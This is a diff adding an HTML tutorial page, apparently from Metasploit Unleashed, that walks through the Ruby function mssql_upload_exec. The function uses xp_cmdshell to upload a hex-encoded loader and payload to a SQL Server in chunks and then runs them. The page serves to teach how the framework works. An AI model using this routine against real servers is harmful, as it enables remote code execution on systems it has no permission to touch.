@@ -1,0 +1,108 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>The Guts Behind It</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">The
+Guts Behind It</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">Lets look into the
+framework3/lib/msf/core/exploits/ and use your
+favorite editor and edit the mssql.rb file. Do a search for
+"mssql_upload_exec" (control-w for nano and / for vi). You should be
+seeing the following:
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">#<br># Upload and execute a Windows binary through MSSQL queries<br>#<br>def mssql_upload_exec(exe, debug=false)<br>hex = exe.unpack("H*")[0]<br><br>var_bypass = rand_text_alpha(8)<br>var_payload = rand_text_alpha(8)<br><br>print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")<br>print_status("Writing the debug.com loader to the disk...")<br>h2b = File.read(datastore['HEX2BINARY'], File.size(datastore['HEX2BINARY']))<br>h2b.gsub!(/KemneE3N/, "%TEMP%\\#{var_bypass}")<br>h2b.split(/\n/).each do |line|<br>mssql_xpcmdshell("#{line}", false)<br>end<br><br>print_status("Converting the debug script to an executable...")<br>mssql_xpcmdshell("cmd.exe /c cd %TEMP% &amp;&amp; cd %TEMP% &amp;&amp; debug &lt; %TEMP%\\#{var_bypass}", debug)<br>mssql_xpcmdshell("cmd.exe /c move %TEMP%\\#{var_bypass}.bin %TEMP%\\#{var_bypass}.exe", debug)<br><br>print_status("Uploading the payload, please be patient...")<br>idx = 0<br>cnt = 500<br>while(idx &lt; hex.length - 1)<br>mssql_xpcmdshell("cmd.exe /c echo #{hex[idx,cnt]}&gt;&gt;%TEMP%\\#{var_payload}", false)<br>idx += cnt<br>end<br><br>print_status("Converting the encoded payload...")<br>mssql_xpcmdshell("%TEMP%\\#{var_bypass}.exe %TEMP%\\#{var_payload}", debug)<br>mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_bypass}.exe", debug)<br>mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)<br><br>print_status("Executing the payload...")<br>mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout =&gt; 1})<br>end</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">The def mssql_upload_exec(exe,
+debug=false) requires two parameters
+and sets the debug to false by default unless otherwise specified.
+</span>
+<p style="color: rgb(0, 0, 0);">The hex = exe.unpack("H*")[0] is some
+Ruby Kung-Fuey that takes our
+generated executable and magically turns it into hexadecimal for us.
+</p>
+<p style="color: rgb(0, 0, 0);">var_bypass = rand_text_alpha(8) and
+var_payload =
+rand_text_alpha(8) creates two variables with a random set of 8 alpha
+characters, for example: PoLecJeX
+</p>
+<p style="color: rgb(0, 0, 0);">The print_status must always be used
+within Metasploit, HD will
+not accept puts anymore! If you notice there are a couple things
+different for me vs. python, in the print_status you'll notice
+"#{var_payload}.exe this subsititues the variable var_payload into the
+print_status message, so you would essentially see portrayed back
+"PoLecJeX.exe"
+</p>
+<p style="color: rgb(0, 0, 0);">Moving on, the h2b =
+File.read(datastore['HEX2BINARY'],
+File.size[datastore['HEX2BINARY'])) will read whatever the file
+specified in the "HEX2BINARY" datastore, if you look at when we fired
+off the exploit, it was saying "h2b", this file is located at
+data/exploits/mssql/h2b, this is a file that I had previously created
+that is a specific format for windows debug that is essentially a
+simple bypass for removing restrictions on filesize limit. We first
+send this executable, windows debug converts it back to a binary for
+us, and then we send the metasploit payload and call our prior
+converted executable to convert our metasploit file.
+</p>
+<p style="color: rgb(0, 0, 0);">The h2b.gsuc!(/KemneE3N/,
+"%TEMP%\\#{var_bypass}") is simply
+substituing a hardcoded name with the dynamic one we created above, if
+you look at the h2b file, KemneE3N is called on multiple occasions and
+we want to randomly create a name to obfuscate things a little better.
+The gsub just substitutes the hardcoded with the random one. The
+h2b.split(/\n/).each do |line| will start a loop for us and split the
+bulky h2b file into multiple lines, reason being is we can't send the
+entire bulk file over at once, we have to send it a little at a time as
+the MSSQL protocol does not allow us very large transfers through SQL
+statements. Lastly, the mssql_xpcmdshell("#{line}", false) sends the
+initial stager payload line by line while the false specifies debug as
+false and to not send the information back to us.
+</p>
+<p style="color: rgb(0, 0, 0);">The next few steps convert our h2b file
+to a binary for us
+utilizing Windows debug, we are using the&nbsp;%TEMP% directory for
+more
+reliability. The mssql_xpcmdshell strored procedure is allowing
+this to occur.
+</p>
+<p style="color: rgb(0, 0, 0);">The idx = 0 will server as a counter
+for us to let us know when
+the filesize has been reached, and the cnt = 500 specifies how many
+characters we are sending at a time. The next line sends our payload to
+a new file 500 characters at a time, increasing the idx counter and
+ensuring that idx is still less than the hex.length blob. Once that has
+been finished the last few steps convert our metasploit payload back to
+an executable using our previously staged payload then executes it
+giving us our payload!
+</p>
+<p style="color: rgb(0, 0, 0);">Thats it! Phew. In this lesson you
+walked through the creation
+of an overall attack vector and got more familar with what goes on
+behind the curtains. If your thinking about creating a new module, look
+around there is usually something that you can use as a baseline to
+help you create it.
+</p>
+<p style="color: rgb(0, 0, 0);">Hopefully we didn't loose you in this.
+Before we end this
+chapter take a quick peek at lib/msf/core/exploit and edit the
+mssql_commands.rb, here you will see a detailed list of MSSQL commands
+that me and Dark Operator have been building for a little while now.
+You can additionally start creating your own modules off of this if you
+wanted to!
+<br>
+<br>
+</p>
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/Building_A_Metasploit_Module"
+ title="Building A Metasploit Module">Building a Metasploit Module</a></div>
+</body>
+</html>
